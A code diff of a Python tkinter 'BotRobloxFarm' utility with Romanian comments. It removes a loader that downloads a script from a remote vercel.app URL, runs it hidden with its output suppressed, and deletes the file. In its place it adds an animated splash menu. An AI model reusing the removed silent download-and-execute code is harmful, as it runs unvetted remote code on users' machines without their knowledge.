@@ -1,240 +1,203 @@
 import tkinter as tk
 from tkinter import font
-import threading
-import time
-import urllib.request
-import subprocess
-import sys
-import os
-import tempfile
+import math
 
-class BRFApp:
+class BRFMenu:
     def __init__(self):
         self.root = tk.Tk()
-        self.root.title("BRF Loader")
+        self.root.title("BRF")
         
-        # Blochează redimensionarea
-        self.root.resizable(False, False)
+        # Setări fereastră transparentă
+        self.root.overrideredirect(True)
+        self.root.attributes('-alpha', 0.95)
+        self.root.attributes('-topmost', True)
+        self.root.configure(bg='#000000')
         
         # Dimensiuni
-        self.root.geometry("400x250")
-        self.root.configure(bg='#0a0a0a')
+        self.width, self.height = 450, 300
+        self.root.geometry(f"{self.width}x{self.height}")
         
-        # Frame principal
-        main_frame = tk.Frame(self.root, bg='#0a0a0a')
-        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
-        
-        # Titlu
-        title_label = tk.Label(
-            main_frame,
-            text="BRF DOWNLOADER",
-            font=("Arial", 20, "bold"),
-            fg="#00FFAA",
-            bg="#0a0a0a"
+        # Canvas pentru fundal și animații
+        self.canvas = tk.Canvas(
+            self.root,
+            bg='#000000',
+            highlightthickness=0,
+            width=self.width,
+            height=self.height
         )
-        title_label.pack(pady=(0, 20))
+        self.canvas.pack(fill=tk.BOTH, expand=True)
         
-        # Buton START
-        self.start_btn = tk.Button(
-            main_frame,
-            text="START DOWNLOAD",
-            font=("Arial", 14, "bold"),
-            fg="white",
-            bg="#00AA66",
-            activebackground="#00CC88",
-            activeforeground="white",
-            bd=0,
-            padx=30,
-            pady=10,
-            command=self.start_download
-        )
-        self.start_btn.pack(pady=10)
-        
-        # Text pentru status
-        self.status_label = tk.Label(
-            main_frame,
-            text="Apasă START pentru a începe",
-            font=("Consolas", 12),
-            fg="#888888",
-            bg="#0a0a0a",
-            height=2
-        )
-        self.status_label.pack(pady=10)
-        
-        # Buton EXIT
-        exit_btn = tk.Button(
-            main_frame,
-            text="EXIT",
-            font=("Arial", 12),
-            fg="white",
-            bg="#FF4444",
-            activebackground="#FF6666",
-            activeforeground="white",
-            bd=0,
-            padx=20,
-            pady=5,
-            command=self.root.destroy
-        )
-        exit_btn.pack(pady=5)
-        
-        # Variabilă pentru control
-        self.downloading = False
+        # Crează conținutul
+        self.create_background()
+        self.create_text()
+        self.create_buttons()
         
         # Centrează fereastra
         self.center_window()
         
-        # Rulează aplicația
+        # Variabile animație
+        self.angle = 0
+        self.time = 0
+        
+        # Pornește animațiile
+        self.animate()
+        
+        # Evenimente mouse
+        self.canvas.bind("<Button-1>", self.start_move)
+        self.canvas.bind("<B1-Motion>", self.on_move)
+        
         self.root.mainloop()
+    
+    def create_background(self):
+        """Creează fundalul cu gradient și efecte"""
+        # Gradient fundal
+        self.bg_gradient = self.canvas.create_rectangle(
+            0, 0, self.width, self.height,
+            fill="#0a0a1a",
+            outline=""
+        )
+        
+        # Linii decorative animatate
+        self.lines = []
+        colors = ["#00ffaa20", "#00aaff20", "#aa00ff20"]
+        for i in range(3):
+            line = self.canvas.create_line(
+                0, 50 + i*30, self.width, 50 + i*30,
+                fill=colors[i],
+                width=1
+            )
+            self.lines.append(line)
+    
+    def create_text(self):
+        """Creează textul BRF și BotRobloxFarm"""
+        # BRF text - MARE și centrat
+        self.brf_font = font.Font(family="Segoe UI", size=64, weight="bold")
+        self.brf_text = self.canvas.create_text(
+            self.width//2, self.height//2 - 30,
+            text="BRF",
+            font=self.brf_font,
+            fill="#00ffaa",
+            anchor="center"
+        )
+        
+        # BotRobloxFarm text
+        self.sub_font = font.Font(family="Segoe UI", size=22, weight="normal")
+        self.sub_text = self.canvas.create_text(
+            self.width//2, self.height//2 + 30,
+            text="BotRobloxFarm",
+            font=self.sub_font,
+            fill="#88ffcc",
+            anchor="center"
+        )
+        
+        # Linie subțire sub text
+        self.canvas.create_line(
+            self.width//2 - 100, self.height//2 + 60,
+            self.width//2 + 100, self.height//2 + 60,
+            fill="#00ffaa40",
+            width=1
+        )
+    
+    def create_buttons(self):
+        """Creează butoanele X și -"""
+        # Frame pentru butoane (transparent)
+        self.button_frame = tk.Frame(self.canvas, bg='#00000000')
+        self.button_frame.place(x=self.width-80, y=10, width=70, height=30)
+        
+        # Buton Minimize (-)
+        self.min_btn = tk.Button(
+            self.button_frame,
+            text="–",
+            font=("Arial", 14, "bold"),
+            fg="white",
+            bg="#4488ff",
+            activebackground="#66aaff",
+            activeforeground="white",
+            bd=0,
+            width=2,
+            height=1,
+            command=self.root.iconify
+        )
+        self.min_btn.pack(side=tk.LEFT, padx=2)
+        
+        # Buton Close (X)
+        self.close_btn = tk.Button(
+            self.button_frame,
+            text="×",
+            font=("Arial", 14, "bold"),
+            fg="white",
+            bg="#ff4444",
+            activebackground="#ff6666",
+            activeforeground="white",
+            bd=0,
+            width=2,
+            height=1,
+            command=self.root.destroy
+        )
+        self.close_btn.pack(side=tk.LEFT, padx=2)
+        
+        # Text mic în colț
+        self.canvas.create_text(
+            10, self.height - 10,
+            text="v2.0",
+            font=("Arial", 8),
+            fill="#444444",
+            anchor="sw"
+        )
     
     def center_window(self):
         """Centrează fereastra"""
         self.root.update_idletasks()
-        width = 400
-        height = 250
         screen_width = self.root.winfo_screenwidth()
         screen_height = self.root.winfo_screenheight()
-        x = (screen_width // 2) - (width // 2)
-        y = (screen_height // 2) - (height // 2)
-        self.root.geometry(f'{width}x{height}+{x}+{y}')
+        x = (screen_width // 2) - (self.width // 2)
+        y = (screen_height // 2) - (self.height // 2)
+        self.root.geometry(f'+{x}+{y}')
     
-    def start_download(self):
-        """Pornește downloadul într-un thread separat"""
-        if not self.downloading:
-            self.downloading = True
-            self.start_btn.config(state='disabled', text="DOWNLOADING...")
-            
-            # Pornește thread pentru download
-            thread = threading.Thread(target=self.download_process, daemon=True)
-            thread.start()
+    def start_move(self, event):
+        """Începe glisarea"""
+        self.x = event.x
+        self.y = event.y
     
-    def download_process(self):
-        """Procesul de download în background"""
-        try:
-            # PAS 1: Preparing
-            self.update_status("⏳ Preparing download...")
-            time.sleep(1)
-            
-            # PAS 2: Downloading
-            self.update_status("⬇️ Downloading BRF script...")
-            
-            url = "https://brf-eight.vercel.app/brf.py"
-            temp_path = ""
-            
-            with tempfile.NamedTemporaryFile(suffix='.py', delete=False) as f:
-                temp_path = f.name
-                urllib.request.urlretrieve(url, temp_path)
-            
-            # PAS 3: Executing
-            self.update_status("⚡ Executing script...")
-            time.sleep(1)
-            
-            # Rulează scriptul SILENȚIOS
-            startupinfo = None
-            if sys.platform == "win32":
-                startupinfo = subprocess.STARTUPINFO()
-                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                startupinfo.wShowWindow = subprocess.SW_HIDE
-            
-            # Rulează în fundal
-            subprocess.Popen(
-                [sys.executable, temp_path],
-                startupinfo=startupinfo,
-                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL
-            )
-            
-            # PAS 4: Cleaning
-            self.update_status("🧹 Cleaning up...")
-            time.sleep(1)
-            
-            # Șterge fișierul temporar
-            try:
-                for _ in range(3):
-                    try:
-                        os.unlink(temp_path)
-                        break
-                    except:
-                        time.sleep(0.1)
-            except:
-                pass
-            
-            # PAS 5: Done
-            self.update_status("✅ Download complete!\nScript is running in background.")
-            time.sleep(2)
-            
-            # Arată fereastra cu BRF
-            self.show_brf_window()
-            
-        except Exception as e:
-            self.update_status(f"❌ Error: {str(e)[:50]}")
-        finally:
-            self.downloading = False
-            self.root.after(100, self.reset_button)
+    def on_move(self, event):
+        """Glisează fereastra"""
+        deltax = event.x - self.x
+        deltay = event.y - self.y
+        x = self.root.winfo_x() + deltax
+        y = self.root.winfo_y() + deltay
+        self.root.geometry(f"+{x}+{y}")
     
-    def update_status(self, message):
-        """Actualizează status label"""
-        self.root.after(0, lambda: self.status_label.config(text=message))
-    
-    def reset_button(self):
-        """Resetează butonul START"""
-        self.start_btn.config(state='normal', text="START DOWNLOAD")
-    
-    def show_brf_window(self):
-        """Arată fereastra cu BRF"""
-        # Ascunde fereastra principală
-        self.root.withdraw()
+    def animate(self):
+        """Animații continue"""
+        self.time += 0.05
         
-        # Creează fereastra BRF
-        brf_window = tk.Toplevel()
-        brf_window.title("BRF")
-        brf_window.geometry("300x200")
-        brf_window.configure(bg='#000000')
-        brf_window.resizable(False, False)
+        # 1. Pulsare text BRF
+        pulse = (math.sin(self.time * 1.5) + 1) / 2
+        r = int(pulse * 50)
+        g = 255
+        b = int(170 + pulse * 85)
+        brf_color = f'#{r:02x}{g:02x}{b:02x}'
+        self.canvas.itemconfig(self.brf_text, fill=brf_color)
         
-        # Fără borduri și mereu deasupra
-        brf_window.overrideredirect(False)
-        brf_window.attributes('-topmost', True)
+        # 2. Animație linii fundal
+        for i, line in enumerate(self.lines):
+            offset = math.sin(self.time + i) * 10
+            y_pos = 50 + i*30 + offset
+            self.canvas.coords(line, 0, y_pos, self.width, y_pos)
         
-        # Adaugă conținut
-        brf_label = tk.Label(
-            brf_window,
-            text="BRF",
-            font=("Arial", 48, "bold"),
-            fg="#00FFAA",
-            bg="#000000"
-        )
-        brf_label.pack(expand=True)
+        # 3. Gradient animat
+        gradient_phase = math.sin(self.time * 0.3) * 0.1 + 0.5
+        dark = int(10 * gradient_phase)
+        gradient_color = f'#{dark:02x}0a{int(26*gradient_phase):02x}'
+        self.canvas.itemconfig(self.bg_gradient, fill=gradient_color)
         
-        sub_label = tk.Label(
-            brf_window,
-            text="BotRobloxFarm",
-            font=("Arial", 16),
-            fg="#888888",
-            bg="#000000"
-        )
-        sub_label.pack()
+        # 4. Efect de "glow" pe text
+        glow_size = abs(math.sin(self.time)) * 3
+        self.canvas.itemconfig(self.brf_text, font=("Segoe UI", 64 + int(glow_size), "bold"))
         
-        # Buton close
-        close_btn = tk.Button(
-            brf_window,
-            text="CLOSE",
-            font=("Arial", 12),
-            fg="white",
-            bg="#FF4444",
-            command=lambda: [brf_window.destroy(), self.root.destroy()]
-        )
-        close_btn.pack(pady=20)
-        
-        # Centrează
-        brf_window.update_idletasks()
-        width, height = 300, 200
-        screen_width = brf_window.winfo_screenwidth()
-        screen_height = brf_window.winfo_screenheight()
-        x = (screen_width // 2) - (width // 2)
-        y = (screen_height // 2) - (height // 2)
-        brf_window.geometry(f'{width}x{height}+{x}+{y}')
+        # Continuă animația
+        self.root.after(50, self.animate)
 
-# Pornire aplicație
+# Rulează aplicația
 if __name__ == "__main__":
-    app = BRFApp()
+    app = BRFMenu()
